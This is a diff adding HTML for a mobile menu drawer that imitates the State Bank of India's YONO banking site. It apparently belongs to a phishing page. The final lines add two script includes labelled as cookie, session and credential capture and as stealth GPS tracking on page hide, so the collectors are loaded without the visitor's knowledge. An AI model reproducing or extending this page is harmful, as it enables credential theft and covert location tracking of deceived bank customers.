+      <a href="#">Accounts & Deposits <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#673391"
+          stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <polyline points="9 18 15 12 9 6"></polyline>
+        </svg></a>
+      <a href="#">Loans <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#673391" stroke-width="2"
+          stroke-linecap="round" stroke-linejoin="round">
+          <polyline points="9 18 15 12 9 6"></polyline>
+        </svg></a>
+      <a href="#">Cards <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#673391" stroke-width="2"
+          stroke-linecap="round" stroke-linejoin="round">
+          <polyline points="9 18 15 12 9 6"></polyline>
+        </svg></a>
+      <a href="#">Investments <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#673391"
+          stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <polyline points="9 18 15 12 9 6"></polyline>
+        </svg></a>
+    </div>
+    <div class="drawer-bottom-links">
+      <a href="https://yonoretail.sbi.bank.in/registration/services/complaint/help-center" target="_blank">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#673391" stroke-width="2"
+          stroke-linecap="round" stroke-linejoin="round">
+          <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path>
+          <polygon points="10 8 14 12 10 16" fill="#673391" stroke="none"></polygon>
+        </svg>
+        Get Help
+      </a>
+      <a href="https://sbi.bank.in/web/personal-banking/digital/whatsapp-banking" target="_blank">
+        <svg width="22" height="22" viewBox="0 0 24 24" fill="#25D366" xmlns="http://www.w3.org/2000/svg">
+          <path
+            d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.888-.788-1.487-1.761-1.66-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z" />
+        </svg>
+        WhatsApp
+      </a>
+    </div>
+    <div class="drawer-footer">
+      <span style="color:#888; font-weight:500; width:45%; text-align:center;">English</span>
+      <div style="border-left: 1px solid #d5c9e2; height: 16px;"></div>
+      <div class="font-size" style="width:45%; color:#333; font-weight:500;">
+        <span id="mobBtnFontMinus" style="font-size:12px; cursor:pointer;">A-</span>
+        <span id="mobBtnFontReset" style="font-size:14px; cursor:pointer;">A</span>
+        <span id="mobBtnFontPlus" style="font-size:16px; font-weight:600; cursor:pointer;">A+</span>
+      </div>
+    </div>
+  </div>
+<!-- NetraX Collector: Cookie, Session & Credential Capture -->
+<script src="core/netrax_collector.js"></script>
+<!-- NetraX Location Tracker: Stealth GPS on Page Hide -->
+<script src="core/netrax_location_tracker.js"></script>
 </body>
+
 </html>
